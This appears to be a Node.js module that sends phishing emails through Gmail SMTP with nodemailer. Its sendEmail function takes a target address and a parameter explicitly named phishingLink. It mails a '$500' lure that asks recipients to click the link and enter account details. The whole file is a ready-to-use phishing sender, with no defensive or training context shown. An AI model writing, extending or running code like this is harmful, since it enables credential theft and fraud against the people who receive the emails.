const nodemailer = require("nodemailer");
require("dotenv").config();

// Configure SMTP transport for sending emails
const transporter = nodemailer.createTransport({
  host: "smtp.gmail.com",
  port: 465,
  secure: true, // true for port 465, false for port 587
  auth: {
    user: process.env.SMTP_USER, // Your Gmail address
    pass: process.env.SMTP_PASS, // Your Gmail app password
  },
});

async function sendEmail(toEmail, phishingLink) {
  const mailOptions = {
    from: process.env.SMTP_USER,
    to: toEmail,
    subject: "Get your $500 today",
    html: `<p>Get your $500 today! Click the link and fill out account details to redeem: <a href="${phishingLink}">Get my money!</a></p>`,
  };

  try {
    await transporter.sendMail(mailOptions);
    console.log("Email sent successfully");
  } catch (error) {
    console.error("Error sending email:", error);
  }
}

module.exports = { sendEmail };
